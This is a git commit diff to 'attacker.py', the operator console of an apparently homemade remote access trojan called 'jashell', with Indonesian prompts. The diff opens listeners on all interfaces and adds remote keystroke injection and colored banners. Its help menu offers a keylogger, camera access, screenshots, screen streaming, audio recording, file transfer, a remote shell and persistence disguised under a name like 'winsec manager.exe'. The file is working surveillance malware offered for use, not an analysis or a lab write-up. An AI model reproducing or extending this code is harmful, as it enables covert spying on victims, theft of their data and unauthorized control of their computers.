4befbd333474632aa93d04ea00b11f359e6d7f97
eizaj02 <shan16042011@gmail.com>
2025-12-25 21:30:50 +0700

    Refactor socket binding and enhance print output
    Refactor socket binding to listen on all interfaces and improve print statements with color formatting.

--- attacker.py
+++ attacker.py
@@ -5,20 +5,36 @@ import struct
 import pickle
 import cv2
 import threading
-import sys
+import wave
 import pyaudio
+import pyfiglet
+import random
+from colorama import Fore, Back
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-soc.bind(('192.168.18.210', 9999))
-print('[+] Menunggu koneksi...')
+soc.bind(('0.0.0.0', 9999))
+print(Fore.GREEN+'[+] Menunggu koneksi...')
 soc.listen(1)
 
 koneksi = soc.accept()
 _target = koneksi[0]
 ip = koneksi[1]
 print(_target)
-print(f'[+] Terhubung ke {str(ip)}')
+print(Fore.CYAN+f'[+] Terhubung ke {str(ip)}')
 
+def keystroke():
+     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+          s.bind(('0.0.0.0', 9995))
+          s.listen(1)
+          print(Fore.GREEN+'Connect')
+          conn, addr= s.accept()
+          with conn:
+               print(Fore.CYAN+f'connected {addr}')
+               while True:
+                    command = input('text: ')
+                    conn.sendall(command.encode())
+                    break
+     print(Fore.GREEN+'send')
 
 FORMAT = pyaudio.paInt16
 CHANNELS = 1
@@ -29,18 +45,18 @@ def receive_and_save():
      frames = []
      try:
           with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-               s.bind(('192.168.18.210', 9996))
+               s.bind(('0.0.0.0', 9996))
                s.listen(1)
                conn, addr = s.accept()
                with conn:
-                    print('connect')
+                    print(Fore.GREEN+'connect')
                     while True:
                          data = conn.recv(CHUNK)
                          if not data:
                               break
                          frames.append(data)
-          print('saving WAV file')
-          WAVE_OUTPUT = "retrieved_audio.wav"
+          print(Fore.CYAN+'saving WAV file')
+          WAVE_OUTPUT = 'retrieved_audio.wav'
           with wave.open(WAVE_OUTPUT, 'wb') as wf:
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(2)
@@ -49,10 +65,10 @@ def receive_and_save():
           print(f'{WAVE_OUTPUT}')
      except socket.error as e:
           print(e)
-
+     
 def konversi_byte_screen_recorder():
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-     sock.bind(('192.168.18.210', 9997))
+     sock.bind(('0.0.0.0', 9997))
      sock.listen(1)
      konek = sock.accept()
      tg = konek[0]
@@ -88,7 +104,7 @@ def record_screen():
 
 def konversi_byte_stream():
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-     sock.bind(('192.168.18.210', 9998))
+     sock.bind(('0.0.0.0', 9998))
      sock.listen(1)
      konek = sock.accept()
      tg = konek[0]
@@ -129,13 +145,16 @@ def upload_file(namafile):
 def download_file(namafile):
      file = open(namafile, 'wb')
      _target.settimeout(1)
-     _file = _target.recv(4096)
+     _file = _target.recv(100000)
      while _file:
+          print(Fore.GREEN+'downloading')
           file.write(_file)
           try:
-               file = _target.recv(4096)
+               file = _target.recv(100000)
           except socket.timeout as e:
+               print(Fore.CYAN+'downloaded')
                break
+
      _target.settimeout(None)
      file.close()
 
@@ -150,8 +169,9 @@ def data_diterima():
 
 def shellc():
     n = 0
+    print(Fore.BLUE+"Type 'help' for help")
     while True:
-        perintah = input('jashell << ')
+        perintah = input(Fore.GREEN+'jashell~# ')
         data = json.dumps(perintah)
         _target.send(data.encode())
         if perintah in('exit','quit'):
@@ -188,21 +208,45 @@ def shellc():
              file.close()
         elif perintah == 'screensr':
              record_screen()
-        elif perintah == 'rec_audio':
-             recieve_and_save()
         elif perintah == 'help':
-             print("""
+             print(Fore.BLUE+"""
                    -exit/quit >> keluar
+                   
                    -clear     >> bersihkan terminal
+
                    -download  >> mendownload file
+
                    -upload    >> mengupload file
+
                    -start_log >> memulai keylogger
+
                    -baca_log  >> membaca hasil keylogger
+
                    -stop_log  >> menghentikan keylogger
+
                    -start_cam >> mengakses kamera
+
                    -screensh  >> screenshot layar
+
                    -screensr  >> berbagi layar
-                   """)                 
+
+                   -persistence >> menjalankan persistensi
+                   contoh:    peristence winsec manager.exe
+                   
+                   -rec_audio >> merekam audio
+                   
+                   -send      >> mengirimkan keyboard
+
+                   -banner    >> baner
+                   """)
+        elif perintah == 'rec_audio':
+             receive_and_save()
+        elif perintah == 'banner':
+             list_banner = [pyfiglet.figlet_format('JASHELL', font='slant'), pyfiglet.figlet_format('SHELL', font='3-d'), pyfiglet.figlet_format('JASHELL', font='standard'), pyfiglet.figlet_format('SHELL', font='banner')]
+             choice = random.choice(list_banner)
+             print(choice)
+        elif perintah == 'send':
+             keystroke()  
         else:
              hasil = data_diterima()
              print(hasil)
